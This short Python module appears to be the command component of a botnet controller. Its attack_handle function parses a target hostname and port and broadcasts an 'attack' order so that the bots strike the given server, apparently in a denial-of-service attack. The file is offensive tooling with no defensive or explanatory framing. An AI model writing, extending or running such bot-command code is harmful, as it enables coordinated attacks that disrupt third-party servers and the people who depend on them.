''' attack '''

import argparse

async def attack_handle(messenger, line):
    ''' Signal the bots to attack '''
    # Destructure line
    raw_args = line.split(' ')[1:]

    parser = argparse.ArgumentParser(description='Parse the attack command for the bots')
    parser.add_argument('host_name', help='the hostname of the target server', type=str)
    parser.add_argument('port', help='the port of the target server', type=int)
    args = parser.parse_args(raw_args)

    # Send the messaage to the server
    await messenger.send_channel('attack {0} {1}'.format(args.host_name, args.port))
